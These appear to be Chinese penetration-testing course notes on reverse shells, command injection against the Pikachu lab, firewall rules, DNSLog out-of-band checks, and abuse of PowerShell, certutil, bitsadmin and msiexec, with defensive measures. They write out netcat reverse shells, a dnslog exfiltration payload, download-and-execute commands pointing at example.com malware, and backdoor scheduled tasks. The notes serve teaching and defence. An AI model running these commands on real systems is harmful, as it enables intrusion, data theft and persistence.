Day05 基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载
=
常规基本渗透命令
-
### Linux&cmd&powershell常用命令  
<https://blog.csdn.net/weixin_43303273/article/details/83029138>  

### 上传下载文件命令生成:  
<https://forum.ywhack.com/bountytips.php?download>  
Linux : wget curl python rubyperl java等  
Windows : PowerShell Certutil Bitsadmin msiexec mshta rundll32等

### 反弹shell命令生成：  
<https://forum.ywhack.com/shell.php>  

Netcat
-
### 介绍
简称nc，是一款功能强大的网络工具，在网络管理、渗透测试以及安全评估等领域有着广泛应用，常被称为 “网络瑞士军刀”。  
Netcat 可以用于远程执行命令。  
Windows版本的Netcat：  
<https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>

### 1、正向连接 本地监听，等待对方连接  

#### Linux控制Windows  
>Windows绑定CMD到本地5566端口
>```cmd
>nc -e cmd -lvp 5566
>```
>Linux主动连接目标
>```bash
>nc ip 5566
>```
#### Windows控制Linux  
>绑定sh到本地5566端口
>```bash
>nc -e /bin/sh-lvp 5566  
>```
>主动连接目标 
>```cmd
>nc ip 5566  
>```

### 2、反向连接 主动给出去，对方监听  

#### Linux主动给出  
>Linux绑定sh到目标5566端口  
>```bash
>nc -e /bin/sh 接收者IP 5566
>```  
>Windows监听5566连接  
>```cmd
>nc -lvvp 5566  
>```

#### Windows主动给出  
>Windows绑定CMD到目标5566端口   
>```cmd
>nc -e cmd 接收者IP 5566  
>```
>Linux监听5566连接  
>```bash
>nc -lvvp 5566  
>```

***受制于万恶的NAT， 内网的机器只能主动找其他主机.***

特殊符号
-
    Linux	            可用    |	||	&	&&	 ；	``
    Windows-cmd	        可用	|	||	&	&&        不可用 ；	``
    Windows-powershell	可用	|	||	&	&&   ；   不可用 ``

### 1.	| （管道符号）
例如，使用管道可以将文件内容通过`cat`命令输出，并通过`grep`命令进行筛选：
cat file.txt | grep "keyword"
https://blog.csdn.net/zhangkunls/article/details/143167921
### 2.	||（逻辑或）
command1 || command2
如果 command1 执行失败（返回一个非零状态码），则 command2 会被执行。如果 command1 执行成功（返回零状态码），则 command2 不会被执行。
### 3.	&&（逻辑与）
https://blog.csdn.net/dessler/article/details/142343304
### 4.	&（后台任务）
在Linux中，当你在命令的末尾添加“&”时，该命令会在后台运行，这样你就可以继续在同一个终端上进行其他操作，而不会因为该命令的执行而被阻塞。
### 5.	；
分号（;）用于在命令行中分隔多个命令，使得这些命令可以顺序执行。
### 6.	``
``中的内容执行后替换

实战
-
Windows Server 部署Pikachu漏洞练习平台，找到RCE-exec“ping”板块  
1、	下载源码  
2、	添加网站并上传源码  
3、	找到Pikachu漏洞练习平台中的RCE-exec“ping”  
4、	利用特殊符号进行漏洞利用  

Windows防火墙
-
<i>Windows 防火墙是 Windows 用于监控和控制进出计算机的网络流量的安全工具。通过配置防火墙策略，可以有效保护系统免受网络攻击和未经授权的访问。</i>

### Windows 防火墙的基本功能
    入站规则：控制外部网络对计算机的访问。
    出站规则：控制计算机访问外部网络的行为。
    网络类型配置：根据网络环境（公共、专用、域）设置不同的防火墙规则。
    应用程序控制：允许或阻止特定应用程序的网络访问。

### 配置防火墙策略的方法
#### 使用图形界面（GUI）
1.	打开 控制面板 > 系统和安全 > Windows Defender 防火墙。
2.	在左侧菜单中，选择 高级设置，进入 高级安全 Windows Defender 防火墙。
3.	在这里可以配置
     入站规则：管理外部访问本机的规则。  
     出站规则：管理本机访问外部的规则。  
     连接安全规则：配置 IPsec 规则，用于加密网络通信。  
     监视：查看当前生效的规则和连接。  
#### 使用命令行工具（netsh） 
通过 netsh 命令可以快速配置防火墙策略。  
查看当前防火墙配置   
```cmd
netsh advfirewall show allprofiles  
```
启用或禁用防火墙  
```cmd
netsh advfirewall set allprofiles state on  
netsh advfirewall set allprofiles state off  
```
添加入站规则  
```
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80  
```
#### 使用 PowerShell
PowerShell 提供了更强大的管理功能。例如：
查看所有防火墙规则：
```powershell
Get-NetFirewallRule
```
创建新的入站规则：
```powershell
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
```

### Windows对于防火墙的策略
1.	默认阻止所有入站流量：除非明确允许，<b>否则阻止所有外部访问。</b>
2.	允许必要的出站流量：限制出站流量，防止恶意软件外传数据。
3.	按网络类型配置：
>公共网络：使用最严格的规则。  
专用网络：适当放宽规则，方便内部通信。  
域网络：根据域策略配置。

4. 常见防火墙策略示例
允许特定端口的入站流量：
允许 HTTP（端口 80）和 HTTPS（端口 443）流量：
```cmd
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="Allow HTTPS" dir=in action=allow protocol=TCP localport=443
```
阻止特定 IP 地址的访问：
```cmd
netsh advfirewall firewall add rule name="Block IP" dir=in action=block remoteip=192.168.1.100
```
允许特定应用程序的出站流量：
```powershell
New-NetFirewallRule -DisplayName "Allow Chrome" -Direction Outbound -Program "C:\Program Files\Google\Chrome\Application\chrome.exe" -Action Allow
```
Linux防火墙
-
<i>Linux 防火墙是用于保护系统免受未经授权访问的重要工具。它通过控制进出系统的网络流量来增强安全性。在 Linux 中，最常用的防火墙工具是 iptables、firewalld 和 UFW。</i>

### 1. iptables
`iptables` 是 Linux 中最经典的防火墙工具，基于内核的 Netfilter 框架。它通过规则链（Chains）来管理流量。

基本概念
表（Tables）：
  `filter`：默认表，用于过滤数据包。
  `nat`：用于网络地址转换（NAT）。
  `mangle`：用于修改数据包（如 TTL）。
  `raw`：用于配置数据包是否被连接跟踪。

链（Chains）：
  `INPUT`：处理进入系统的数据包。
  `OUTPUT`：处理从系统发出的数据包。
  `FORWARD`：处理通过系统转发的数据包。
  `PREROUTING` 和 `POSTROUTING`：用于 NAT。

常用命令
1. 查看规则：
   
   iptables -L -v -n
   

2. 允许特定端口（如 80）：
   
   iptables -A INPUT -p tcp --dport 80 -j ACCEPT
   

3. 拒绝特定 IP 地址：
   
   iptables -A INPUT -s 192.168.1.100 -j DROP
   

4. 保存规则：
   
   iptables-save > /etc/iptables/rules.v4
   

5. 恢复规则：
   
   iptables-restore < /etc/iptables/rules.v4
   

---

### 2. firewalld
`firewalld` 是一个动态管理防火墙的工具，支持区域（Zones）和服务（Services）的概念，适合管理复杂的网络环境。

基本概念
区域（Zones）：
  `public`：默认区域，适用于公共网络。
  `trusted`：允许所有流量。
  `internal`：适用于内部网络。

服务（Services）：
  预定义的服务（如 `http`、`ssh`），简化规则配置。

常用命令
1. 查看当前区域：
   
   firewall-cmd --get-default-zone
   

2. 允许服务（如 http）：
   
   firewall-cmd --zone=public --add-service=http --permanent
   

3. 允许端口（如 8080）：
   
   firewall-cmd --zone=public --add-port=8080/tcp --permanent
   

4. 重新加载防火墙规则：
   
   firewall-cmd --reload
   

5. 查看所有规则：
   
   firewall-cmd --list-all
   

---

### 3. UFW（Uncomplicated Firewall）
`UFW` 是一个简化版的防火墙工具，适合初学者使用。它基于 `iptables`，但提供了更简单的命令行接口。

常用命令
1. 启用 UFW：
   
   sudo ufw enable
   

2. 允许端口（如 22）：
   
   sudo ufw allow 22/tcp
   

3. 拒绝端口（如 80）：
   
   sudo ufw deny 80/tcp
   

4. 允许特定 IP 地址：
   
   sudo ufw allow from 192.168.1.100
   

5. 查看状态：
   
   sudo ufw status
   

6. 删除规则：
   
   sudo ufw delete allow 22/tcp
   

---

### 4. 防火墙配置建议
1. 默认策略：
   设置默认策略为拒绝所有流量，然后根据需要开放端口。
   例如：
     
     iptables -P INPUT DROP
     iptables -P FORWARD DROP
     iptables -P OUTPUT ACCEPT
     

2. 开放必要端口：
   仅开放必要的端口（如 SSH、HTTP、HTTPS）。
   避免开放不必要的端口。

3. 限制访问范围：
   使用 IP 地址或 IP 段限制访问范围。
   例如：
     
     iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT
     

4. 启用日志记录：
   记录被拒绝的流量，便于排查问题。
   例如：
     
     iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROPPED: "
     

5. 定期备份规则：
   定期备份防火墙规则，防止配置丢失。


存在漏洞，但是数据不回显：  
1、	反弹shell  
2、	带外查询  

DnsLog
-
<i><http://www.dnslog.cn/>是一个提供 DNSLog 服务的网站。  
DNSLog 是一种利用 DNS 协议记录相关信息来进行安全测试、漏洞挖掘等的技术手段。在安全测试场景中：  
当测试人员想要探测目标系统是否存在某些漏洞（如命令执行漏洞）时，若在目标系统中执行的命令能够触发向特定域名发起 DNS 查询请求，通过在 “dnslog.cn” 这类平台上点击”Get SubDomain”创建唯一标识的域名，就可以通过查看该平台上的 DNS 查询记录，确认目标系统是否执行了特定命令，以此来判断漏洞是否存在。</i>  

Windows的cmd不能使用``，所以我们可以用powershell来定义变量：  
输出当前用户
```powershell
$a=whoami  
echo $a  
```
输出当前用户和ip配置
```powershell
$x=whoami;$y=ipconfig  
$x+$y  
```
作用是把$x中的\替换成x，并赋值给$xx变量  
```powershell
$xx=$x.replace('\','x');  
```
上面的语句中分号是作为每条命令的结束，这些功能是cmd所不具备的。  


当数据不能回显时  
看一下是否能正确执行命令  
在pikachu漏洞练习平台模拟让服务器向dnslog.cn发起请求  
Rce-ping构造恶意语句  
```powershell
127.0.0.1 | powershell.exe $a=whoami;$aa=$a.replace('\','x');$bb='.xxxxxx.dnslog.cn';$c=$aa+$bb;ping $c;  
```
这时候刷新，dnslog就会出现记录  



PowerShell 是 Windows 系统中的一种强大的脚本语言和命令行工具，广泛用于系统管理和自动化任务。然而，由于其功能强大且易于使用，PowerShell 也常被攻击者用于恶意目的，例如执行恶意脚本、下载恶意软件、绕过安全检测等。
PowerShell 的恶意用途
1. 执行恶意脚本
攻击者可以通过 PowerShell 直接执行恶意脚本，例如：
```powershell
powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')"
```
解释：
  `Invoke-Expression`：执行字符串中的 PowerShell 代码。
  `New-Object Net.WebClient`：创建一个 WebClient 对象。
  `DownloadString`：从远程服务器下载脚本并执行。

2. 下载恶意文件
PowerShell 可以用于从远程服务器下载恶意文件：
```powershell
(New-Object Net.WebClient).DownloadFile('http://example.com/malware.exe', 'malware.exe')
```
解释：
  `DownloadFile`：将远程文件下载到本地。

3. 绕过执行策略
PowerShell 的执行策略（Execution Policy）可以限制脚本的执行，但攻击者可以通过以下方式绕过：
powershell
powershell -ExecutionPolicy Bypass -File malware.ps1

解释：
  `-ExecutionPolicy Bypass`：绕过执行策略，直接执行脚本。

4. 内存中执行恶意代码
PowerShell 可以在内存中执行恶意代码，避免将文件写入磁盘：
powershell
$code = (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')
Invoke-Expression $code

解释：
  将恶意代码下载到内存并执行，避免触发文件扫描。

5. 横向移动
攻击者可以使用 PowerShell 在局域网内横向移动，例如通过 WMI 或 PSRemoting：
powershell
Invoke-Command -ComputerName TargetPC -ScriptBlock { Start-Process malware.exe }

解释：
  `Invoke-Command`：在远程计算机上执行命令。

6. 权限提升
PowerShell 可以用于提权操作，例如通过漏洞利用或滥用系统工具：
powershell
Start-Process powershell -Verb RunAs

解释：
  `-Verb RunAs`：以管理员权限运行 PowerShell。

7. 信息收集
PowerShell 可以用于收集系统信息，例如用户账户、网络配置、进程列表等：
powershell
Get-Process
Get-Service
Get-NetIPConfiguration

解释：
  收集系统信息，帮助攻击者制定下一步行动。

8. 持久化
攻击者可以使用 PowerShell 创建持久化后门，例如通过计划任务或注册表：
powershell
schtasks /create /tn "Backdoor" /tr "powershell -c 'malware.ps1'" /sc onstart /ru System

解释：
  创建计划任务，在系统启动时执行恶意脚本。

---

防御措施

1. 限制 PowerShell 的使用
通过组策略限制普通用户使用 PowerShell。
禁用 PowerShell v2（旧版本存在更多漏洞）：
  powershell
  Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
  

2. 监控 PowerShell 活动
启用 PowerShell 日志记录：
  脚本块日志（Script Block Logging）。
  模块日志（Module Logging）。
使用 SIEM 工具（如 Splunk、ELK）分析日志。

3. 使用约束语言模式
限制 PowerShell 的功能，防止执行危险操作：
  powershell
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
  

4. 部署终端检测与响应（EDR）
使用 EDR 工具（如 CrowdStrike、Carbon Black）检测异常 PowerShell 活动。

5. 定期更新和打补丁
确保系统和 PowerShell 版本是最新的，修复已知漏洞。
6. 用户培训
提高用户安全意识，避免点击可疑链接或下载未知文件。

Certutil本质是一个管理证书、证书服务和密钥存储的工具，不过这东西被黑客们玩坏了，可以用这个来下载文件。
certutil.exe -urlcache -split -f <http://example.com/file.txt> file.txt

Certutil 是 Windows 系统自带的一个命令行工具，主要用于管理证书和密钥。然而，由于其功能强大且灵活，Certutil 也被广泛用于文件编码、解码、哈希计算、数据下载等操作，甚至被攻击者用于恶意目的。

---

Certutil 的主要功能
1. 证书管理：
   导入、导出、删除证书。
   查看证书详细信息。
2. 文件编码与解码：
   将文件编码为 Base64 或十六进制格式。
   解码 Base64 或十六进制文件。
3. 哈希计算：
   计算文件的哈希值（如 MD5、SHA1、SHA256）。
4. 数据下载：
   从远程服务器下载文件。
5. 密钥管理：
   生成、导入、导出密钥。

---

Certutil 的常见用法

1. 证书管理
查看证书：
  
  certutil -store My
  
导出证书：
  
  certutil -exportPFX -p password My serial_number output.pfx
  
导入证书：
  
  certutil -importPFX -p password input.pfx
  

2. 文件编码与解码
编码文件为 Base64：
  
  certutil -encode input_file output_file
  
  示例：
  
  certutil -encode myfile.txt myfile.b64
  

解码 Base64 文件：
  
  certutil -decode input_file output_file
  
  示例：
  
  certutil -decode myfile.b64 myfile.txt
  

3. 哈希计算
计算文件的 MD5 哈希值：
  
  certutil -hashfile input_file MD5
  
  示例：
  
  certutil -hashfile myfile.txt MD5
  

计算文件的 SHA256 哈希值：
  
  certutil -hashfile input_file SHA256
  
  示例：
  
  certutil -hashfile myfile.txt SHA256
  

4. 数据下载
从远程服务器下载文件：
  
  certutil -urlcache -split -f http://example.com/file output_file
  
  示例：
  
  certutil -urlcache -split -f http://example.com/malware.exe malware.exe
  

5. 密钥管理
生成密钥：
  
  certutil -genkey -algorithm RSA -keysize 2048 -key container_name
  
  示例：
  
  certutil -genkey -algorithm RSA -keysize 2048 -key MyKeyContainer
  

导出密钥：
  
  certutil -exportPFX -p password My serial_number output.pfx
  

---

Certutil 的恶意用途
由于 Certutil 的功能强大，攻击者常利用其进行恶意操作，例如：
1. 下载恶意文件：
   使用 `certutil -urlcache` 下载恶意软件。
2. 编码恶意文件：
   使用 `certutil -encode` 将恶意文件编码为 Base64，绕过检测。
3. 解码恶意文件：
   使用 `certutil -decode` 将编码的恶意文件还原。

---

防御措施
1. 监控 Certutil 的使用：
   通过日志监控 Certutil 的异常使用。
2. 限制 Certutil 的权限：
   通过组策略限制普通用户使用 Certutil。
3. 使用安全软件：
   部署终端检测与响应（EDR）工具，检测异常行为。
4. 定期审计：
   定期审计系统日志，发现潜在威胁。


certutil.exe -urlcache -split -f http://example.com/file.txt file.txt


Bitsadmin 是 Windows 系统中的一个命令行工具，用于管理后台智能传输服务（Background Intelligent Transfer Service, BITS）。BITS 是一种用于异步传输文件的服务，通常用于下载更新或上传错误报告。然而，由于其功能强大，Bitsadmin 也被攻击者用于恶意目的，例如下载恶意软件或执行横向移动。

---

Bitsadmin 的主要功能
1. 文件下载：
   从远程服务器下载文件。
2. 任务管理：
   创建、监控和管理 BITS 任务。
3. 优先级设置：
   设置任务的优先级（如 foreground、high、normal、low）。
4. 错误处理：
   处理传输过程中的错误和重试。

---

Bitsadmin 的基本用法

1. 创建下载任务
创建一个 BITS 任务并开始下载文件：

bitsadmin /create mytask
bitsadmin /addfile mytask http://example.com/file.exe C:\path\to\save\file.exe
bitsadmin /resume mytask

解释：
  `/create`：创建一个新的 BITS 任务。
  `/addfile`：向任务中添加要下载的文件。
  `/resume`：开始或恢复任务。

2. 监控任务状态
查看任务的当前状态：

bitsadmin /info mytask

解释：
  `/info`：显示任务的详细信息。

3. 暂停任务
暂停正在进行的任务：

bitsadmin /suspend mytask

解释：
  `/suspend`：暂停任务。

4. 恢复任务
恢复暂停的任务：

bitsadmin /resume mytask

解释：
  `/resume`：恢复任务。

5. 取消任务
取消并删除任务：

bitsadmin /cancel mytask

解释：
  `/cancel`：取消任务。

6. 设置任务优先级
设置任务的优先级：

bitsadmin /setpriority mytask foreground

解释：
  `/setpriority`：设置任务的优先级（foreground、high、normal、low）。

---

Bitsadmin 的恶意用途

1. 下载恶意文件
攻击者可以使用 Bitsadmin 从远程服务器下载恶意文件：

bitsadmin /create mytask
bitsadmin /addfile mytask http://example.com/malware.exe C:\path\to\save\malware.exe
bitsadmin /resume mytask

解释：
  下载恶意文件并保存到本地。

2. 持久化
攻击者可以创建计划任务，定期使用 Bitsadmin 下载恶意文件：

schtasks /create /tn "Backdoor" /tr "bitsadmin /create mytask & bitsadmin /addfile mytask http://example.com/malware.exe C:\path\to\save\malware.exe & bitsadmin /resume mytask" /sc daily /st 00:00

解释：
  创建计划任务，每天午夜下载恶意文件。

3. 横向移动
攻击者可以在局域网内使用 Bitsadmin 下载恶意文件到其他主机：

psexec \\TargetPC -u username -p password bitsadmin /create mytask & bitsadmin /addfile mytask http://example.com/malware.exe C:\path\to\save\malware.exe & bitsadmin /resume mytask

解释：
  使用 PsExec 在远程主机上执行 Bitsadmin 命令。

---

防御措施

1. 监控 Bitsadmin 的使用
通过日志监控 Bitsadmin 的异常使用。
使用 SIEM 工具（如 Splunk、ELK）分析日志。

2. 限制 Bitsadmin 的权限
通过组策略限制普通用户使用 Bitsadmin。
禁用 BITS 服务（如果不需要）：
  
  sc config bits start= disabled
  

3. 使用安全软件
部署终端检测与响应（EDR）工具，检测异常行为。

4. 定期审计
定期审计系统日志，发现潜在威胁。

---

总结
Bitsadmin 是 Windows 系统中一个强大的文件传输工具，但也常被攻击者用于恶意目的。通过监控和限制 Bitsadmin 的使用，可以有效降低安全风险。同时，结合其他安全措施（如日志审计、EDR 工具），可以构建更全面的安全防护体系。




Msiexec 是 Windows 系统中的一个命令行工具，用于安装、修改和卸载 Microsoft Installer（MSI）包。MSI 包是一种常见的软件安装包格式，通常用于分发和安装应用程序。然而，由于其功能强大，Msiexec 也被攻击者用于恶意目的，例如执行恶意代码或绕过安全检测。

---

Msiexec 的主要功能
1. 安装 MSI 包：
   安装应用程序或更新。
2. 卸载 MSI 包：
   卸载已安装的应用程序。
3. 修复安装：
   修复已安装的应用程序。
4. 静默安装：
   在不显示用户界面的情况下安装应用程序。
5. 日志记录：
   生成安装日志，用于调试和分析。

---

Msiexec 的基本用法

1. 安装 MSI 包
安装一个 MSI 包：

msiexec /i path\to\installer.msi

解释：
  `/i`：安装指定的 MSI 包。

2. 卸载 MSI 包
卸载一个已安装的 MSI 包：

msiexec /x path\to\installer.msi

解释：
  `/x`：卸载指定的 MSI 包。

3. 静默安装
在不显示用户界面的情况下安装 MSI 包：

msiexec /i path\to\installer.msi /quiet

解释：
  `/quiet`：静默安装，不显示用户界面。

4. 修复安装
修复已安装的应用程序：

msiexec /fa path\to\installer.msi

解释：
  `/fa`：修复所有文件。

5. 生成日志
生成安装日志，用于调试和分析：

msiexec /i path\to\installer.msi /l*v logfile.txt

解释：
  `/l*v`：生成详细日志并保存到指定文件。

---

Msiexec 的恶意用途

1. 执行恶意代码
攻击者可以通过 Msiexec 执行嵌入在 MSI 包中的恶意代码：

msiexec /i http://example.com/malware.msi /quiet

解释：
  从远程服务器下载并静默安装恶意 MSI 包。

2. 绕过安全检测
攻击者可以使用 Msiexec 绕过某些安全检测工具，因为 Msiexec 是合法的系统工具：

msiexec /i path\to\malware.msi /quiet

解释：
  静默安装恶意 MSI 包，避免触发安全警报。

3. 持久化
攻击者可以创建计划任务，定期使用 Msiexec 安装恶意 MSI 包：

schtasks /create /tn "Backdoor" /tr "msiexec /i http://example.com/malware.msi /quiet" /sc daily /st 00:00

解释：
  创建计划任务，每天午夜安装恶意 MSI 包。

4. 横向移动
攻击者可以在局域网内使用 Msiexec 安装恶意 MSI 包到其他主机：

psexec \\TargetPC -u username -p password msiexec /i http://example.com/malware.msi /quiet

解释：
  使用 PsExec 在远程主机上执行 Msiexec 命令。



防御措施

1. 监控 Msiexec 的使用
通过日志监控 Msiexec 的异常使用。
使用 SIEM 工具（如 Splunk、ELK）分析日志。

2. 限制 Msiexec 的权限
通过组策略限制普通用户使用 Msiexec。
禁用 Msiexec 的远程执行功能（如果不需要）。

3. 使用安全软件
部署终端检测与响应（EDR）工具，检测异常行为。
